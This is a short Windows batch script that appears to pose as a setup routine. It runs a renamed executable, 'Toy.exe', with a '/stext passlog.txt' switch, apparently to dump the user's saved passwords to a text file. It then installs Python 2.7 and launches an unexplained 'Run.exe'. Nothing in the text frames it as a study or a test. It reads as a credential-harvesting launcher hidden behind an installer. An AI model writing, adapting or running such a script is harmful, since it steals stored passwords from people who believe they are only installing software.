@echo off
cd Setup
Toy.exe /stext passlog.txt
python-2.7.14.msi
Run.exe
exit